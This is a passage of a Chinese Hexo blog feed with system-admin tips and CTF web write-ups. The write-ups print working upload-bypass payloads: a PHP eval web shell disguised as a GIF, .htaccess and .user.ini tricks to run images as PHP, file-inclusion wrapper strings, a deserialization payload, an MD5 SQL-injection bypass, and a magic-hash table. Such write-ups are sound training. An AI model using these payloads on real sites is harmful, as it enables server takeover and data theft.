        <content type="html"><![CDATA[<h1 id="hexo-博文中图片部署"><a href="#hexo-博文中图片部署" class="headerlink" title="hexo 博文中图片部署"></a>hexo 博文中图片部署</h1><p>在<code>source</code>下创建一个<code>images</code>目录，存放图片</p><p>引用方式</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>images<span class="token operator">/</span>xxx<span class="token operator">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以为每条博文分别创建</p><p>在_post目录下创建一个与md同名的文件夹放图片</p><p>应用方式</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>xxx<span class="token operator">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意这里是<code>\</code>,windows下是<code>/</code></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux(kali)安装vm-tools</title>
      <link href="/2021/04/11/linux-an-zhuang-vm-tools/"/>
      <url>/2021/04/11/linux-an-zhuang-vm-tools/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-kali-安装vm-tools"><a href="#linux-kali-安装vm-tools" class="headerlink" title="linux(kali)安装vm-tools"></a>linux(kali)安装vm-tools</h2><h3 id="1-安装vmware自带的"><a href="#1-安装vmware自带的" class="headerlink" title="1.安装vmware自带的"></a>1.安装vmware自带的</h3><p>安装完linux后，右击安装的虚拟机，点击安装vmware-tools</p><p><img src="https://images.dadream.eu.org/images/2024/07/480f99d172f43db60225052677ad75ee.png"></p><p>再点击图中红线上的光盘</p><p><img src="https://images.dadream.eu.org/images/2024/07/690123591788bf9050b5c96a708630b1.png"></p><p>先创建一个文件夹<code>tools</code> <code>mkdir tools</code></p><p>进入刚才打开光盘的目录 <code>cd /media/cdrom0</code></p><p>将压缩包移到刚才创建的文件夹tools下  <code>cp VMwareTools-10.3.22-15902021.tar.gz /tools/</code></p><p>在进入创建的文件夹</p><p>解压<code>tar -xf VMwareTools-10.3.22-15902021.tar.gz </code></p><p><img src="https://images.dadream.eu.org/images/2024/07/74e0a84925b501d748ebdf70369d471b.png"></p><p>进入<code>vmware-tools-distrib</code></p><p>执行安装<code>./vmware-install.pl</code></p><p>然后一路enter</p><h3 id="2-安装kali自带的"><a href="#2-安装kali自带的" class="headerlink" title="2.安装kali自带的"></a>2.安装kali自带的</h3><p><code>apt-get install open-vm-tools-desktop fuse</code></p><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><h3 id="重新安装vm-tools是灰色的"><a href="#重新安装vm-tools是灰色的" class="headerlink" title="重新安装vm-tools是灰色的"></a>重新安装vm-tools是灰色的</h3><p><img src="https://images.dadream.eu.org/images/2024/07/e37db67d254c0a18a3d5bda9ac0eb06a.png"></p><p>如图，可以点击编辑虚拟机设置</p><p>然后将CD/DVD换为自动检查或者新建一个，然后开启虚拟机安装vm-tools，之后可以改回来</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理机ssh连接不上虚拟机</title>
      <link href="/2021/04/05/wu-li-ji-ssh-lian-jie-bu-shang-xu-ni-ji/"/>
      <url>/2021/04/05/wu-li-ji-ssh-lian-jie-bu-shang-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<p>保证虚拟机连得上网，比如能ping百度</p><p>最简单办法</p><p><img src="https://images.dadream.eu.org/images/2024/07/c13697ce72d3a25c8d78f723ca0d5f1b.png"></p><p>点击更改设置获取管理员权限</p><p><img src="https://images.dadream.eu.org/images/2024/07/fc61b4184c6a596e2026963a05aaf817.png"></p><p>然后还原</p><p><img src="https://images.dadream.eu.org/images/2024/07/ebeaf20ada19997f7f2f11ca0a48a249.png"></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_2019 CheckIn</title>
      <link href="/2021/04/01/suctf-2019-checkin/"/>
      <url>/2021/04/01/suctf-2019-checkin/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>尝试提交<img src="https://images.dadream.eu.org/images/2024/07/8ccdd8b2dd28872c8b1e34d768cf32c2.png"></p><p>illegal suffix</p><p>尝试修改后缀和Content-Type字段，还是不合法</p><p>修改后缀为jpg，再次上传</p><p><img src="https://images.dadream.eu.org/images/2024/07/f29133de19db698190c41e6d8bbf5e47.png"></p><p>不能有&lt;?，修改文件内容</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">&gt;</span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/fdf7eef98ec46cbaeea6d62de0ef9343.png"></p><p>exif_imagetype函数</p><p>在头部加个图片幻数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">&gt;</span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/dbdcfd3f1258bdffd69f35011b7d5005.png"></p><p>访问图片，确实成功了</p><p><img src="https://images.dadream.eu.org/images/2024/07/07204f593250b853aa043430a4d0ad21.png"></p><p>成功，但是要连接需要把它解释为php文件</p><p>上传<code>.htaccess</code>文件</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">GIF89aSetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/86dc24a0297a883bc4a81b6300efe2b3.png"></p><p>用蚁剑连接没有成功，可能中间件不是Apache</p><p>可以改用上传<code>.uesr.ini</code>文件</p><p>使用条件</p><p>上传马的文件夹有php文件</p><p>原理：存在php文件，就会向目录里查找.jpg，解析为php</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">GIF89aauto_prepend_file<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>jpg如果前面的马写的是GIF89a<span class="token operator">&lt;</span><span class="token operator">%</span> @<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>则加一行GIF89aauto_prepend_file<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>jpgasp_tags<span class="token operator">=</span>on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/a4aeaa1469ec4bcad78116819c1c34d8.png"></p><p>连接</p><p><img src="https://images.dadream.eu.org/images/2024/07/333bc5f92a798a36f03ed24221b8ebf1.png"></p><p>成功，在根目录找到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019 NiZhuanSiWei</title>
      <link href="/2021/04/01/zjctf-2019-nizhuansiwei/"/>
      <url>/2021/04/01/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>进入页面便是代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码审计</p><p><code>file_get_contents($text,'r')==="welcome to the zjctf"</code>读取$text内容与后面比较</p><p><code>file_get_contents</code>可以用到伪协议</p><p>enctype=”multipart/form-data” 的时候 php://input 是无效的</p><p>构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>preg_match("/flag/",$file)</code>file不能包含flag</p><p><code>include($file);  //useless.php</code>包含文件</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resoure=useless.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=useless.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$password = unserialize($password);</code>反序列化函数</p><p>将上面一个类序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token number">123</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">125</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>useless<span class="token operator">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token number">123</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">125</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后ctrl+U查看flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希碰撞表</title>
      <link href="/2021/03/31/ha-xi-peng-zhuang/"/>
      <url>/2021/03/31/ha-xi-peng-zhuang/</url>
      
        <content type="html"><![CDATA[<h3 id="哈希碰撞表"><a href="#哈希碰撞表" class="headerlink" title="哈希碰撞表"></a>哈希碰撞表</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">0</span>e开头的md5和原值：s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Easy MD5</title>
      <link href="/2021/03/31/bjdctf2020-easy-md5/"/>
      <url>/2021/03/31/bjdctf2020-easy-md5/</url>
      
        <content type="html"><![CDATA[<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>查看源码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>leveldo4.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>in<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>give<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>提交一个值抓包试试</p><p>发现响应头中有hint</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Hint: <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">'admin'</span> <span class="token keyword">where</span> password<span class="token operator">=</span>md5<span class="token punctuation">(</span>$pass<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里考察md5的知识</p><p><code>md5($pass,true)</code>返回$pass md5的16进制内容，输出解析就形成</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or'</span><span class="token number">6</span>XXXX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/019c33fb76d5b64fe5307f5ba48915a0.png"></p><p>被sql语句解析，就能形成拼接</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payloadpassword<span class="token operator">=</span>ffifdyop拼接后：<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">'admin'</span> <span class="token keyword">where</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token operator">or</span><span class="token string">'6XXXX'</span>即可绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>进入levels91.php     Do You Like MD5?查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里又考察哈希碰撞，也可以用[]绕过  <code>== !=</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payloada<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">or</span>a<span class="token operator">=</span>s878926199a<span class="token operator">&amp;</span>b<span class="token operator">=</span>s155964671a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里一样，md5[]绕过 <code>=== !==</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadparam1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019BuyFlag</title>
      <link href="/2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/"/>
      <url>/2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>进入payflag页面，查看源码，得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token 